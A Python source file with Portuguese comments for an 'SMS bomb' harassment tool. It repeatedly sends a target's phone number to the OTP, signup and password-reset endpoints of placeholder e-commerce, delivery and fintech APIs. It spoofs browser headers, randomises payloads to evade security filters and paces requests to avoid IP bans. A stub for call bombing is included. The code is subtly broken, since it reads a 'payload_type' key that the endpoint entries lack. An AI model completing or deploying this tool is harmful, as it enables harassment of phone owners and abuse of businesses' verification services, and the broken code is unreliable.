import requests
import time
import random
from core import utils

class BombEngine:
    def __init__(self):
        # Headers para parecer um navegador real e evitar bloqueios simples
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/json",
            "Connection": "keep-alive"
        }

    def attack_sms(self, number):
        """Realiza o ataque de SMS enviando requisições para endpoints de verificação."""
        print(f"[*] Iniciando ataque de SMS em: {number}")
        print("[*] Buscando endpoints de disparo...")

        # LISTA DE ENDPOINTS (Aqui é onde a mágica acontece)
        # Você deve adicionar URLs de APIs de sites de e-commerce, delivery, etc.
        # Cada site tem um formato de JSON diferente.
        # LISTA DE ENDPOINTS E MODELOS DE REQUISIÇÃO
        # Cada item abaixo é um "perfil" de site diferente
        endpoints = [
            {
                "name": "E-commerce (Cadastro)",
                "url": "https://api.exemplo-loja.com/v1/auth/register",
                "type": "standard",
                "payload_template": {"phone": "{number}", "country": "55"}
            },
            {
                "name": "Delivery (Verificação)",
                "url": "https://api.exemplo-delivery.com/v2/otp/send",
                "type": "user_data",
                "payload_template": {"mobile": "{number}", "device_id": "{device}"}
            },
            {
                "name": "Fintech (Recuperação)",
                "url": "https://api.exemplo-banco.com/v1/forgot-password",
                "type": "security",
                "payload_template": {"phone_number": "{number}", "lang": "pt-BR"}
            }
        ]

        try:
            for i in range(15): # Número de tentativas de flood
                # Escolhe um endpoint aleatório da lista
                target = random.choice(endpoints)
                url = target["url"]
                
                # Geramos dados aleatórios para não ser bloqueado por repetição de IP/User
                payload = self._generate_payload(target["payload_type"], number)

                print(f"[+] [{i+1}] Tentando disparo via: {url}")
                
                try:
                    # A requisição real acontece aqui
                    response = requests.post(url, json=payload, headers=self.headers, timeout=7)
                    
                    if response.status_code in [200, 201, 202]:
                        print(f"    [OK] Requisição enviada! Status: {response.status_code}")
                    else:
                        print(f"    [!] API respondeu com erro: {response.status_code}")
                
                except Exception as e:
                    print(f"    [!] Erro na conexão: {e}")

                # Delay para não travar o Termux e evitar ban de IP imediato
                time.sleep(random.uniform(1.0, 2.5))

            print(f"\n[!] Processo de SMS Bomb concluído.")
        except Exception as e:
            print(f"[!] Erro crítico no motor de ataque: {e}")

    def _generate_payload(self, p_type, number):
        """Gera payloads diferentes para enganar os filtros de segurança."""
        if p_type == "standard":
            return {
                "phone": number,
                "country_code": "55",
                "lang": "pt-BR"
            }
        elif p_type == "user_data":
            return {
                "mobile": number,
                "device_id": random.randint(100000, 999999),
                "session_id": f"sess_{random.randint(100, 999)}",
                "version": "1.0.4"
            }
        else:
            return {"phone": number}

def sms_bomb(alvo, ctx):
    print("\n--- CONFIGURAÇÃO SMS BOMB ---")
    print("[!] Nota: Use o formato completo: 55 + DDD + Número")
    print("[!] Exemplo: 5511999999999")
    
    number = alvo if alvo else input("[?] Digite o número alvo: ")
    
    # Validação básica de entrada
    if not number.isdigit() or len(number) < 10:
        print("[!] Erro: Formato de número inválido.")
        return

    engine = BombEngine()
    engine.attack_sms(number)

def call_bomb(alvo, ctx):
    print(f"[*] Iniciando Call Bomb em: {alvo}")
    print("[!] Erro: Requer integração com API de VoIP (Twilio/Vonage).")